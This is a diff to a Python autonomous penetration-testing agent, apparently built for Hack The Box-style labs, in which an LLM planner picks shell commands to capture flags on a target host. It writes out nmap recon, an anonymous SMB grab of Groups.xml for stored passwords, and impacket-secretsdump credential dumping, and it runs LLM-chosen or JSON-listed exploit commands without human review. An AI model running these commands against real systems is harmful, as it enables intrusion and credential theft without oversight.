@@ -64,53 +64,61 @@ class EnterpriseDynamicAgent:
                 return q
         return p
 
+    def ensure_potential_exploits(self,scan:Path):
+        """Genera el informe de posibles vectores una vez disponible el scan."""
+        report=Path(f"testing/{self.target_ip}/loot/potential_exploits.json")
+        if report.exists():return
+        try:
+            text=scan.read_text(encoding="utf-8",errors="ignore")
+            self.exploit_matcher.analyze_scan_output(text)
+        except Exception as exc:
+            logger.warning("[!] No se pudo generar potential_exploits.json: %s",exc)
+
     def flags_found(self):
-        """Detecta flags reales antes de declarar la misión terminada."""
         root=Path(f"testing/{self.target_ip}")
         if not root.exists(): return []
         found=[]
         filename_patterns=("user.txt","root.txt","local.txt","proof.txt","flag.txt","flags.json","user.flag","root.flag")
-        flag_re=re.compile(r"(?:flag|htb)\\{[^}]{4,200}\\}",re.I)
+        flag_re=re.compile(r"(?:flag|htb)\{[^}]{4,200}\}",re.I)
         for p in root.rglob("*"):
             if not p.is_file(): continue
             if p.name.lower() in filename_patterns:
-                found.append(str(p))
-                continue
+                found.append(str(p)); continue
             try:
                 if p.stat().st_size>2_000_000: continue
                 data=p.read_text(encoding="utf-8",errors="ignore")
                 if flag_re.search(data): found.append(str(p))
-            except (OSError,UnicodeError):
-                continue
+            except (OSError,UnicodeError): continue
         return sorted(set(found))
 
     def autonomous_fallback(self,state):
-        """Pide al LLM una acción nueva cuando el plan determinista se agota."""
-        history=state.get("history",[])
-        blocked=[]
+        history=state.get("history",[]); blocked=[]
         for h in history[-12:]:
             cmd=h.get("command","")
-            if cmd: blocked.append(re.sub(r"\\s+"," ",cmd.strip()))
-        planner=LLMDecisionEngine()
-        augmented_history=list(history)
-        augmented_history.append({"step":state.get("step_count",0),"command":"[PLANNER]","output":"No hay flag todavía. Debes continuar la auditoría. NO declares mission_complete hasta detectar una flag. Comandos ya ejecutados y que NO debes repetir exactamente: " + json.dumps(blocked)})
+            if cmd: blocked.append(re.sub(r"\s+"," ",cmd.strip()))
+        planner=LLMDecisionEngine(); augmented_history=list(history)
+        augmented_history.append({"step":state.get("step_count",0),"command":"[PLANNER]","output":"No hay flag todavía. Debes continuar la auditoría. NO declares mission_complete hasta detectar una flag. Comandos ya ejecutados y que NO debes repetir exactamente: "+json.dumps(blocked)})
         for _ in range(3):
-            decision=planner.consult_tactical_next_step(self.target_ip,augmented_history,state.get("last_output", ""))
-            cmd=CommandSanitizer.clean(decision.get("command", ""))
+            decision=planner.consult_tactical_next_step(self.target_ip,augmented_history,state.get("last_output",""))
+            cmd=CommandSanitizer.clean(decision.get("command",""))
             if not cmd: continue
-            normalized=re.sub(r"\\s+"," ",cmd.strip())
-            if normalized not in blocked:
-                return cmd,"autonomous",f"llm.{self.fingerprint(cmd)}"
+            normalized=re.sub(r"\s+"," ",cmd.strip())
+            if normalized not in blocked:return cmd,"autonomous",f"llm.{self.fingerprint(cmd)}"
             augmented_history.append({"step":state.get("step_count",0),"command":"[REJECTED_DUPLICATE]","output":f"El comando {cmd!r} ya fue ejecutado. Selecciona una técnica diferente."})
         return None
 
     def determine_next_action(self,state):
         history=state.get("history",[]); commands=[h.get("command","") for h in history]
-        for raw_path in (Path(f"testing/{self.target_ip}/potential_exploits.json"),Path("potential_exploits.json")):
+        report_paths=(Path(f"testing/{self.target_ip}/loot/potential_exploits.json"),Path(f"testing/{self.target_ip}/potential_exploits.json"),Path("potential_exploits.json"))
+        for raw_path in report_paths:
             if not raw_path.exists():continue
             try:
                 data=json.loads(raw_path.read_text(encoding="utf-8"))
-                items=data if isinstance(data,list) else next((data[k] for k in ("exploits","vulnerabilities","comandos","commands") if isinstance(data.get(k),list)),[])
+                items=[]
+                if isinstance(data,list):items=data
+                elif isinstance(data,dict):
+                    for value in data.values():
+                        if isinstance(value,list):items.extend(value)
                 for item in items:
                     cmd=item if isinstance(item,str) else (item.get("command") or item.get("exec") or item.get("exploit") or item.get("payload"))
                     if cmd and cmd not in commands:return cmd,"exploitation","json_exploit"
@@ -120,6 +128,7 @@ class EnterpriseDynamicAgent:
         if not scan.exists():
             return (f"nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN testing/{self.target_ip}/scans/{CANONICAL_SCAN} {self.target_ip}","recon","recon.version")
         self.extract_domain_from_scan(scan.read_text(encoding="utf-8",errors="ignore"))
+        self.ensure_potential_exploits(scan)
         domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
         if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
             return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
@@ -127,8 +136,7 @@ class EnterpriseDynamicAgent:
         if creds["username"] and creds["password"] and not any("secretsdump" in c for c in commands):
             return f"impacket-secretsdump {domain}/{creds['username']}:{creds['password']}@{self.target_ip}","post-exploitation","post.secretsdump"
         fallback=self.autonomous_fallback(state)
-        if fallback:
-            return fallback
+        if fallback:return fallback
         return "","autonomous","planner.stalled"
 
     def run_autonomous_loop(self):
@@ -137,25 +145,16 @@ class EnterpriseDynamicAgent:
             if state.get("mission_complete"):return
             flags=self.flags_found()
             if flags:
-                self.state_manager.mark_complete("flag_found:"+flags[0],self.current_step)
-                logger.info("[+] FLAG DETECTADA: %s",flags[0]); return
+                self.state_manager.mark_complete("flag_found:"+flags[0],self.current_step); logger.info("[+] FLAG DETECTADA: %s",flags[0]); return
             command,phase,action_id=self.determine_next_action(state)
             if not command:
-                logger.warning("[!] Planner sin acción nueva; se reintentará con contexto actualizado.")
-                time.sleep(2); continue
-            attempts=state.get("action_attempts",{}).get(action_id,0)
-            recent=state.get("history",[])
-            fp=self.fingerprint(command)
+                logger.warning("[!] Planner sin acción nueva; se reintentará con contexto actualizado."); time.sleep(2); continue
+            attempts=state.get("action_attempts",{}).get(action_id,0); recent=state.get("history",[]); fp=self.fingerprint(command)
             repeats=sum(self.fingerprint(h.get("command",""))==fp for h in recent[-6:])
             if attempts>=MAX_SAME_ACTION_ATTEMPTS or repeats>=MAX_SAME_ACTION_ATTEMPTS:
                 logger.warning("[!] Acción repetida bloqueada: %s. Se fuerza replanning autónomo.",action_id)
                 state.setdefault("history",[]).append({"step":self.current_step,"command":"[BLOCKED_DUPLICATE]","output":f"Acción bloqueada: {command}"})
-                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False)
-                self.current_step+=1
-                continue
-            if phase=="complete":
-                logger.info("[*] El plan determinista terminó sin flag; pasando al planner autónomo.")
-                phase="autonomous"
+                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False); self.current_step+=1; continue
             logger.info("[*] Paso %d/%d | %s | %s",self.current_step,MAX_STEPS,action_id,command)
             result=self.executor.execute_with_polling(command); output=result.get("stdout","")
             if result.get("stderr"):output+="\nSTDERR:\n"+result["stderr"]
